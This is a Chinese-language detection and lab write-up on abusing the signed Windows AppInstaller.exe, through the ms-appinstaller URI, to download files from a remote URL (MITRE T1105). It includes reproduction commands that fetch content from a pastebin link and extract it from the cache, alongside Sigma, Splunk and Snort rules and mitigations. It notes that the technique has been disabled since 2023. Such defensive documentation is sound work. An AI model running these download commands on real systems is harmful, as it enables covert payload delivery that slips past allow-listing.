# T1105-Win-入口工具转移-AppInstaller.exe(白名单、失效)

## 描述

攻击者利用合法工具`AppInstaller.exe`从外部系统将工具或恶意文件转移到被攻陷环境（T1105），以实现工具部署或恶意软件分发。`AppInstaller.exe`是Windows 10内置组件，负责处理`ms-appinstaller`协议，用于安装AppX/MSIX应用程序。攻击者可通过伪造`ms-appinstaller://?source=<URL>`URI，诱导`AppInstaller.exe`从指定URL下载文件并保存到用户临时目录（如`C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_*\AC\INetCache`）。由于其为白名单程序且由Microsoft签名，易被恶意利用以规避检测。

然而，自2023年12月13日起，Microsoft已禁用`ms-appinstaller`协议以防止恶意软件传播（参考相关X帖子和Microsoft Q&A），当前此技术已失效。检测重点在于历史数据分析或遗留系统监控，尤其是涉及`AppInstaller.exe`的DNS查询或文件下载行为。

## 测试案例

1. **AppInstaller文件下载**  
   使用`ms-appinstaller`协议从远程URL下载恶意文件，模拟工具转移。  
2. **临时文件提取**  
   使用`forfiles`提取`AppInstaller.exe`下载的临时文件。  

### 示例命令
- **触发下载**（需用户权限，Windows 10）：
  ```cmd
  start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
  timeout 1 & taskkill /F /IM AppInstaller.exe > NUL
  ```
- **提取临时文件**：
  ```cmd
  forfiles /P "C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_*\AC\INetCache" /S /M * /C "cmd /c if @fsize==8 FOR /F \"tokens=*\" %g IN ('type @path') do @echo %g" > NUL
  ```
- **清理**（如有文件）：
  ```cmd
  del /Q "C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_*\AC\INetCache\*"
  ```

**注意**：由于协议已禁用，现代Windows系统将显示“ms-appinstaller protocol has been disabled”错误。

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录`AppInstaller.exe`进程创建及命令行参数（若启用）。  

**Sysmon日志**  
- **事件ID 1**：记录`AppInstaller.exe`进程创建，捕获命令行参数。  
- **事件ID 3**：记录网络连接，捕获`AppInstaller.exe`的HTTP请求（目标IP/端口）。  
- **事件ID 11**：记录临时文件（如`INetCache`中的下载文件）创建。  

**DNS日志**  
- 捕获`AppInstaller.exe`发起的DNS查询，关联至目标URL。  

**网络日志**  
- 捕获`AppInstaller.exe`的HTTP流量（如向非预期URL的GET请求）。  

**配置日志记录**  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 启用Sysmon配置：监控`AppInstaller.exe`及`INetCache`路径：
  ```xml
  <RuleGroup name="ProcessCreate" groupRelation="and">
    <ProcessCreate onmatch="include">
      <Image condition="contains">AppInstaller.exe</Image>
    </ProcessCreate>
  </RuleGroup>
  <RuleGroup name="FileCreate" groupRelation="and">
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">AppData\Local\Packages\Microsoft.DesktopAppInstaller_</TargetFilename>
    </FileCreate>
  </RuleGroup>
  ```
- 配置IDS/IPS记录HTTP流量。

## 测试复现

### 环境准备
- **靶机**：Windows 10（较旧版本，如未更新至禁用协议的补丁）。  
- **权限**：用户权限（无需管理员）。  
- **工具**：`AppInstaller.exe`（系统自带）、Sysmon、Wireshark、测试Web服务器（如`https://pastebin.com`）。  
- **网络**：可控网络环境，允许HTTPS出站流量。  
- **日志**：启用Windows安全日志、Sysmon日志，配置网络监控。  

### 攻击步骤
1. **触发下载**  
   ```cmd
   start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
   timeout 1 & taskkill /F /IM AppInstaller.exe > NUL
   ```

2. **提取文件**  
   ```cmd
   forfiles /P "C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_*\AC\INetCache" /S /M * /C "cmd /c if @fsize==8 FOR /F \"tokens=*\" %g IN ('type @path') do @echo %g" > NUL
   ```

3. **验证结果**  
   - 检查Sysmon日志（进程创建）：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 1 -and $_.Message -match "AppInstaller.exe" }
     ```
   - 检查网络连接：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 3 -and $_.Message -match "AppInstaller.exe" }
     ```
   - 检查文件创建：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 11 -and $_.Message -match "INetCache" }
     ```
   - 检查Windows安全日志：
     ```powershell
     Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 -and $_.Message -match "AppInstaller.exe" }
     ```
   - 检查Netflow（Wireshark过滤`https`）。  

4. **清理**  
   ```cmd
   del /Q "C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_*\AC\INetCache\*"
   ```

### 示例输出
```cmd
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
Cannot open app package
Reason: The ms-appinstaller protocol has been disabled. Please ask the vendor to update the web link.
For more information go to aka.ms/ms-appinstaller-disabled.
```

**注意**：由于协议已禁用，测试在现代系统上将失败。需使用未更新或遗留系统复现。

## 测试留痕

- **历史日志（若未禁用前执行）**：
  - `AppInstaller.exe`进程创建（Windows安全日志事件ID 4688）。
  - 临时文件（如`INetCache`中的下载文件，Sysmon事件ID 11）。
  - DNS查询至目标URL（DNS日志）。
- **当前状态**：无有效留痕，系统直接拒绝执行。

## 检测方法/思路

**检测规则**  
通过监控`AppInstaller.exe`的DNS查询、网络连接及文件操作，检测历史或遗留系统的恶意行为。以下是具体思路：

1. **日志分析**：
   - 监控DNS日志，检测`AppInstaller.exe`发起的异常域名查询。  
   - 监控Sysmon事件ID 1，检测`AppInstaller.exe`进程创建及命令行参数。  
   - 监控Sysmon事件ID 3，检测`AppInstaller.exe`的HTTP连接（非预期URL）。  
   - 监控Sysmon事件ID 11，检测`INetCache`中的临时文件创建。  
   - 监控Windows安全日志事件ID 4688，检测`AppInstaller.exe`执行（若记录）。  
   - 检查Netflow，检测`AppInstaller.exe`的HTTP流量。  

2. **Sigma规则（AppInstaller DNS查询）**：
   ```yaml
   title: AppInstaller Attempts From URL by DNS
   id: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a
   description: Detects AppInstaller.exe spawned by the default handler for the ms-appinstaller URI, attempting to load/install a package from a URL
   status: experimental
   tags:
     - attack.command_and_control
     - attack.t1105
   references:
     - https://twitter.com/notwhickey/status/1333900137232523264
     - https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
   logsource:
     product: windows
     category: dns_query
   detection:
     selection:
       Image|startswith: 'C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_'
       Image|endswith: '\AppInstaller.exe'
     condition: selection
   fields:
     - Image
     - QueryName
     - User
   falsepositives:
     - Legitimate AppX/MSIX installation
     - Unknown legacy usage
   level: medium
   ```

3. **Sigma规则（AppInstaller文件操作）**：
   ```yaml
   title: AppInstaller Temporary File Creation
   id: 8d0e88f2-9774-47b4-8361-28f3e2bb9e1b
   status: experimental
   description: Detects creation of temporary files by AppInstaller.exe in INetCache directory
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 11
       TargetFilename|contains: 'AppData\Local\Packages\Microsoft.DesktopAppInstaller_'
       TargetFilename|contains: '\AC\INetCache'
     condition: selection
   fields:
     - Image
     - TargetFilename
     - User
   falsepositives:
     - Legitimate AppX/MSIX downloads
     - Legacy system behavior
   level: medium
   ```

4. **SIEM规则**：
   - 检测`AppInstaller.exe`异常行为。
   - 示例Splunk查询：
     ```spl
     (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=1 Image="*AppInstaller.exe" OR
     EventID=3 Image="*AppInstaller.exe" OR
     EventID=11 TargetFilename="*AppData\Local\Packages\Microsoft.DesktopAppInstaller_*")) OR
     (source="WinEventLog:Security" EventCode=4688 Image="*AppInstaller.exe")
     | stats count by Image, CommandLine, DestinationIp, TargetFilename, User, ComputerName
     ```

5. **网络流量分析**：
   - 检查`AppInstaller.exe`的HTTP请求：
     ```bash
     tshark -f "tcp port 443" -Y "http.request"
     ```
   - 使用IDS规则检测异常流量：
     ```snort
     alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"Suspicious AppInstaller HTTP Request"; content:"AppInstaller.exe"; sid:1000011;)
     ```

6. **工具支持**：
   - 使用Wireshark分析`AppInstaller.exe`的HTTP流量。  
   - 使用Sysinternals Process Monitor捕获`AppInstaller.exe`的文件和网络活动。  
   - 使用EDR工具（如CrowdStrike、Carbon Black）监控`AppInstaller.exe`行为。  

7. **威胁情报整合**：
   - 检查下载URL或文件哈希是否与已知恶意样本匹配，结合威胁情报平台（如VirusTotal、AlienVault）。  

## 建议

### 缓解措施

由于`ms-appinstaller`协议已禁用，当前风险较低，但需关注遗留系统：

1. **保持系统更新**  
   - 确保所有Windows系统应用最新补丁，维持`ms-appinstaller`协议禁用状态。  

2. **限制AppInstaller执行**  
   - 使用AppLocker限制`AppInstaller.exe`：
     ```powershell
     New-AppLockerPolicy -RuleType Path -Path "C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_*" -Action Deny -User "Everyone"
     ```

3. **监控遗留行为**  
   - 配置Sysmon监控`AppInstaller.exe`及`INetCache`路径：
     ```xml
     <RuleGroup name="ProcessCreate" groupRelation="and">
       <ProcessCreate onmatch="include">
         <Image condition="contains">AppInstaller.exe</Image>
       </ProcessCreate>
     </RuleGroup>
     <RuleGroup name="FileCreate" groupRelation="and">
       <FileCreate onmatch="include">
         <TargetFilename condition="contains">AppData\Local\Packages\Microsoft.DesktopAppInstaller_</TargetFilename>
       </FileCreate>
     </RuleGroup>
     ```

4. **加强日志监控**  
   - 启用Sysmon事件ID 1、3、11和Windows事件ID 4688，检测`AppInstaller.exe`行为（适用于遗留系统）。  
   - 配置SIEM实时告警`AppInstaller.exe`的网络或文件活动。  
   - 使用EDR工具监控白名单程序滥用。  

5. **定期审计**  
   - 检查`AppInstaller.exe`执行：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 1 -and $_.Message -match "AppInstaller.exe" }
     ```
   - 检查网络连接：
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object { $_.Id -eq 3 -and $_.Message -match "AppInstaller.exe" }
     ```

6. **网络控制**  
   - 配置防火墙阻止非预期`AppInstaller.exe`出站流量：
     ```powershell
     New-NetFirewallRule -DisplayName "Block AppInstaller HTTP" -Direction Outbound -Action Block -Program "C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_*" -Protocol TCP -RemotePort 80,443
     ```

## 参考推荐

- MITRE ATT&CK: T1105  
  <https://attack.mitre.org/techniques/T1105/>  
- LOLBAS: AppInstaller.exe  
  <https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/>  
- Sigma: win_dq_lobas_appinstaller  
  <https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml>  